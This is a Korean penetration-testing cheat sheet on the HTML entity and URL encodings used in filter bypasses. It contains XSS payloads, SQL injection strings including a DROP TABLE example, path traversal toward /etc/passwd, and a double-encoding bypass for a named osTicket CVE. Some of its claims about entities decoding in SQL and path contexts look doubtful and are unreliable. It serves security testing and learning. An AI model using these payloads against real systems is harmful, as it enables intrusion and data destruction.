# 모의해킹에서 자주 사용되는 인코딩/문자 매핑

필터 우회, XSS, SQL 인젝션, 경로 traversal 등에서 나오는 실제 인코딩들을 정리합니다.

## 핵심 매핑 (꼭 기억할 것)

| 문자 | Named | 10진수 | 16진수 | 사용처 |
|------|-------|--------|--------|------|
| `<` | &lt; | &#60; | &#x3C; | HTML 태그 시작, XSS |
| `>` | &gt; | &#62; | &#x3E; | HTML 태그 끝 |
| `"` | &quot; | &#34; | &#x22; | SQL/속성 필터 우회 |
| `'` | &apos; | &#39; | &#x27; | SQL 인젝션 |
| `&` | &amp; | &#38; | &#x26; | 엔티티 시작, 이중 인코딩 |
| `;` | - | &#59; | &#x3B; | SQL 명령 종료 |
| `(` | - | &#40; | &#x28; | 함수 호출 |
| `)` | - | &#41; | &#x29; | 함수 닫음 |
| `/` | - | &#47; | &#x2F; | 경로/주석 |
| `=` | - | &#61; | &#x3D; | 속성/SQL 같음 |
| `+` | - | &#43; | &#x2B; | URL 공백 |
| ` ` (공백) | &nbsp; | &#32; | &#x20; | 공백 |
| `%` | - | &#37; | &#x25; | URL 인코딩 |

---

## 1. XSS (Cross-Site Scripting)

### 기본 필터 우회

```html
<!-- 필터가 < > 를 차단할 때 -->
&#60;script&#62;alert('XSS')&#60;/script&#62;
<!-- 또는 -->
&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;

<!-- 결과: <script>alert('XSS')</script> 실행 -->
```

### 속성 필터 우회

```html
<!-- 필터: onclick=" 를 차단 -->
<img src=x onerror="alert('XSS')">

<!-- 우회: Entity 사용 -->
<img src=x onerror=alert&#40;'XSS'&#41;>
<!-- &#40; = ( , &#41; = ) -->

<!-- 또는 -->
<img src=x onerror=alert&#x28;&#x27;XSS&#x27;&#x29;>
```

### 따옴표 우회

```html
<!-- 필터: " 를 차단 -->
<img src=x alt="XSS">

<!-- 우회 1: &#34; 사용 -->
<img src=x alt=&#34;XSS&#34;>

<!-- 우회 2: &#x22; 사용 (16진수) -->
<img src=x alt=&#x22;XSS&#x22;>

<!-- 우회 3: 따옴표 제거 -->
<img src=x alt=XSS>
```

---

## 2. SQL 인젝션

### 작은따옴표 우회

```sql
-- 필터: ' 를 차단

-- 원본 공격
admin' OR '1'='1

-- 우회 (10진수)
admin&#39; OR &#39;1&#39;=&#39;1

-- 우회 (16진수)
admin&#x27; OR &#x27;1&#x27;=&#x27;1
```

### 큰따옴표 우회

```sql
-- 필터: " 를 차단

-- 원본
admin" OR "1"="1

-- 우회
admin&#34; OR &#34;1&#34;=&#34;1
```

### 주석 우회

```sql
-- 필터: -- 또는 # 를 차단

-- 원본
SELECT * FROM users WHERE id=1; --

-- 우회 (슬래시로 주석)
SELECT * FROM users WHERE id=1; &#47;**/

-- 또는
SELECT * FROM users WHERE id=1 &#35;
<!-- &#35; = # -->
```

### 세미콜론 우회

```sql
-- 필터: ; 를 차단

-- 우회
SELECT * FROM users&#59; DROP TABLE users&#59;
<!-- &#59; = ; -->
```

---

## 3. 경로 Traversal

### 슬래시 우회

```
-- 필터: / 를 차단

원본: ../../../../etc/passwd
우회: ..&#47;..&#47;..&#47;..&#47;etc&#47;passwd
<!-- &#47; = / -->

또는 (16진수):
..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd
```

### 백슬래시 우회

```
Windows에서:
원본: ..\..\..\windows\system32
우회: ..&#92;..&#92;..&#92;windows&#92;system32
<!-- &#92; = \ -->
```

---

## 4. 이중 인코딩 (Double Encoding)

필터가 Entity를 디코딩하지 않을 때 사용

### 원리

```
원본:        "
1차 인코딩:  &#34;
2차 인코딩:  &#38;&#35;&#51;&#52;

분해:
&#38; = &
&#35; = #
&#51; = 3
&#52; = 4

합치면: &#34; (다시 " 로 디코딩됨)
```

### 실무 예 (CVE-2026-22200)

```html
<!-- 1차 필터: htmLawed가 php:// 를 차단 -->
<!-- 공격 페이로드 -->
url(php%3a//)

<!-- 2차 필터: __html_cleanup 이 따옴표 제거 -->
<!-- 우회: 이중 인코딩 -->
url &#38;&#35;&#51;&#52(php%3a//)
<!-- 또는 -->
url &#x26;&#x23;&#x33;&#x34;(php%3a//)

<!-- 해석 순서:
1. htmLawed: &#38;&#35;&#51;&#52; → &#34; (그냥 텍스트)
2. __html_cleanup: &#34; → 제거 안 함 (이미 entity)
3. mPDF: &#34; → " 로 변환 → php:// 실행
-->
```

---

## 5. URL 인코딩 vs Entity

### 혼동하기 쉬운 것들

```
문자: "
URL 인코딩:    %22
Entity:        &#34; 또는 &#x22;

문자: /
URL 인코딩:    %2F
Entity:        &#47; 또는 &#x2F;

문자: '
URL 인코딩:    %27
Entity:        &#39; 또는 &#x27;
```

### 실제 사용

```bash
# URL에서 경로 인코딩
/api/search?q=hello%20world

# HTML 속성에서 Entity
<input value="hello &quot;world&quot;">

# 둘 다 사용 (이중 인코딩)
GET /api/search?q=%3C%73%63%72%69%70%74%3E
<!-- %3C = <, %73 = s, %63 = c, ... -->
```

---

## 6. 변환 도구

### Python

```python
# 문자 → 10진 entity
ord('"')  # 34
ord('<')  # 60
ord('\'') # 39

# 10진 → 문자
chr(34)   # "
chr(60)   # <
chr(39)   # '

# 10진 → 16진
hex(34)   # 0x22
hex(60)   # 0x3c

# 16진 → 문자
chr(0x22) # "
chr(0x3C) # <

# HTML entity 생성
f"&#{ord('"')};"   # &#34;
f"&#x{ord('"'):x};" # &#x22;
```

### 명령어

```bash
# 문자 → ASCII 코드
python3 -c "print(ord('\"'))"   # 34
python3 -c "print(ord('<'))"    # 60

# ASCII → 16진
python3 -c "print(hex(60))"     # 0x3c

# 직접 entity 생성
python3 -c "print(f'&#34;')"
python3 -c "print(f'&#x22;')"

# 이중 인코딩 자동화
python3 << 'EOF'
char = '"'
entity = f'&#{ord(char)};'
double = ''.join(f'&#x{ord(c):x};' for c in entity)
print(double)  # &#x26;&#x23;&#x33;&#x34;&#x3b;
EOF
```

---

## 7. 실전 체크리스트

필터 우회 시도 순서:

```
1. 그냥 시도
   <script>alert('XSS')</script>

2. 10진 entity
   &#60;script&#62;alert('XSS')&#60;/script&#62;

3. 16진 entity
   &#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;

4. 혼합
   &#60;script&#62;alert&#40;&#39;XSS&#39;&#41;&#60;/script&#62;

5. 이중 인코딩
   &#38;&#35;&#54;&#48;&#59;...

6. URL 인코딩 + Entity
   %26%2334%3B (&#34; 를 URL 인코딩)

7. 특수 인코딩 (UTF-8, Unicode 등)
   \x3c\x73\x63... (16진 바이트)
```

---

## 8. 참고

### 자주 나오는 조합

CVE-2026-22200 (osTicket):
- &#34; (큰따옴표) + &#38;&#35;&#51;&#52; (이중 인코딩)

일반 XSS:
- &#60;, &#62; (< >) 또는 &#x3C;, &#x3E;

SQL 인젝션:
- &#39; (작은따옴표) 또는 &#34; (큰따옴표)

경로 Traversal:
- &#47; (슬래시) 또는 &#92; (백슬래시)

### 매핑 암기팁

```
34 = " (쌍따옴표)
39 = ' (작은따옴표)
47 = / (슬래시)
60 = < (작음)
62 = > (큼)
38 = & (앰퍼샌드)
59 = ; (세미콜론)
```

공식:
- 10진수: &#숫자;
- 16진수: &#x16진수;
- 이름: &이름;
